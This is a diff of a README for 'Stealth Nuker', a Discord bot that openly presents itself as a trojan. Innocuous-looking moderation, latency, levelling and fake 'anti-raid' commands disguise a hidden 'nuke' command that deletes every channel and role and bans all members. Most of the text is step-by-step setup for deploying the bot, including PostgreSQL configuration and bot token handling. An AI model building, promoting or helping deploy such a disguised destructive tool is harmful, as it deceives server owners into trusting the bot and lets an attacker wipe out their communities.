@@ -1,8 +1,8 @@
-# Stealth Nuker v1.0
+# Stealth Nuker v1.1
 
 Stealth Nuker is a python-based nuke script for discord.py. However, this nuker has a trick up its sleeve!
 
-You see, unlike other nuke scripts, this nuke script contains some commands that are *helpful* to the server, such as your regular clear command, latency command or kick command, as well as a few commands that look as if they do something useful (but actually don't do anything). However, hidden within these commands, is a secret **nuke** command, that will destroy the server.
+You see, unlike other nuke scripts, this nuke script contains some commands that are *helpful* to the server, such as your regular clear command, latency command or kick command (it even has its own, SQL supported levelling system!), as well as a few commands that look as if they do something useful (but actually don't do anything). However, hidden within these commands, is a secret **nuke** command, that will destroy the server.
 
 This way, the Stealth Nuker acts like a trojan horse rather than a typical piece of 'malicious' script; it disguises itself to be apart of the good guys.
 
@@ -12,27 +12,27 @@ How to install and use the Stealth Nuker:
 1. Install the latest version of Python onto your computer: https://www.python.org/downloads/release/python-383/
 2. When installing python, you **must** check the "Add to PATH" check box.
 3. Install the latest version of Postgresql onto your computer: http://www.enterprisedb.com/postgresql-tutorial-resources-training?cid=48
-4. When installing Postgresql, you must remember the password you set; **it is extremely important.**
-5. Furthermore, when installing Postgresql, on the screen with the four check boxes, decheck all of them as they are not needed.
-6. After Postgresql has installed, run pgAdmin 4 (You can find it by searching for it in the windows search box).
-7. Open the, "Servers", drop down menu at the left of the page.
+4. When installing Postgresql, you must remember the password you set. **This is extremely important!**
+5. Furthermore, when installing Postgresql, on the screen with the four check boxes, decheck all of them: They aren't needed.
+6. After Postgresql has been installed, run **pgAdmin 4** *(You can find it by searching for it in the windows search box)*.
+7. Open the "Servers" drop down menu at the left of the page.
 8. Right click "databases", then move to create, then click "Database...".
-9. Name the database, "levels_db", then click, "Save".
+9. Name the database `levels_db` then click "Save".
 10. Open the "Schemas" drop down menu of the database you created.
 11. Right click "Tables", then move to create, then click "Table...".
-12. Name the table, "users", then move to the "Columns" tab.
-13. Click "Add new row." (The + icon at the end of the "Columns" title widget).
-14. Name the new row, "user_id", set the data type to "character varying" and set "Not NULL?" to "yes".
-15. Click "Add new row."
-16. Name the new row, "guild_id" and set the data type to "character varying".
-17. Click "Add new row."
-18. Name the new row, "lvl" and set the data type to "integer".
-19. Click "Add new row."
-20. Name the new row, "xp" and set the data type to "integer." Then, click "Save". You can now close the page.
+12. Name the table `users`, then move to the "Columns" tab.
+13. Click "Add new row" (The + icon at the end of the "Columns" title widget).
+14. Name the new row `user_id` and set the data type to "character varying" and set "Not NULL?" to "yes".
+15. Click "Add new row".
+16. Name the new row `guild_id` and set the data type to "character varying".
+17. Click "Add new row".
+18. Name the new row `lvl` and set the data type to "integer".
+19. Click "Add new row".
+20. Name the new row `xp` and set the data type to "integer". Then, click "Save"; you can now close the page.
 21. Visit the releases page for the Stealth Nuker: https://github.com/catterall/Stealth-Nuker/releases
 22. Download the latest version the extract it where ever you want to use it (You'll need 7zip to extract the file).
 22. Go to https://discord.com/developers/applications.
-23. Click "New Application."
+23. Click "New Application".
 24. Give the application whatever name you want your trojan bot to be called.
 25. Click the "Bot" button on the side of the screen.
 26. Click the "Add Bot" button.
@@ -43,24 +43,34 @@ How to install and use the Stealth Nuker:
 31. Go back to the "Bot" page (Click the "Bot" button on the side of the screen).
 32. Click the copy button next to the bot's profile picture display (You could change the bots profile picture for added stealth).
 33. Open the `run_settings.json` file in the stealth bot folder you installed from the releases page.
-34. Set the "postgresql_password" value to the password you created when installing postgresql.
-35. Set the "prefix" value to whatever you want the bot prefix to be.
-36. Set the "token" value to the bot token you copied.
+34. Set the `postgresql_password` value to the password you created when installing postgresql.
+35. Set the `prefix` value to whatever you want the bot prefix to be.
+36. Set the `token` value to the bot token you copied.
 37. Save the `run_settings.json` file and close it.
-38. Reopen the pgAdmin 4, as it will need to be open for the bot to work locally.
-39. Once the pgAdmin 4 is open in the background, run the `run.bat` file to start the bot.
+38. Reopen the **pgAdmin 4**, as it will need to be open for the bot to work locally.
+39. Once the **pgAdmin 4** is open in the background, run the `run.bat` file to start the bot.
+
+Remember, whenever you wish to run the bot, you must have the **pgAdmin 4** open in the background!
 
 
-Commands (as of v1.1):
+Features:
 -
-*Stealth commands (Designed to make the bot seem trust-worthy):*
-- **latency:** Displays the bots latency on the given server.
-- **db_add_user:** Pretends to add a user to an anti-raid database.
-- **db_del_user:** Pretends to remove a user from an anti-raid database.
-- **kick:** Kicks a user.
-- **ban:** Bans a user.
-- **clear <1-1000>:** Clears a number of messages from the current text channel.
-- **level:** Display a user's current level.
+**The Stealth Nuker for discord has many features, in the form of its various *cogs*:**
+- In moderation, you can find the following features:
+  - **clear <1-1000>:** The clear command is a command used to clear the last 1-1000 messages.
+  - **kick:** The kick command is a command used to kick a user.
+  - **ban:** The ban command is a command used to ban a user.
+  - **unban** The unban command is a command used to unban a user.
 
-*Malicious commands (Designed to harm the server and/or give you more power):*
-- **nuke:** Deletes all channels, deletes all roles then bans all users.
+- In anti-raid, you can find the following features:
+  - **db_add_user:** Pretends to add a user to a list of raiders in a database.
+  - **db_del_user:** Pretends to delete a user from a list of raiders in a database.
+
+- In status, you can find the following features:
+  - **latency:** Displays the bot's latency in milliseconds (ms).
+
+- In levels, you can find the following features (v1.1+):
+  - **level:** Displays a user's level.
+
+**Hidden commands (Intended for malicious use, useable by any members on a server):**
+- **nuke:** Deletes all channels, deletes all roles, then bans all members.
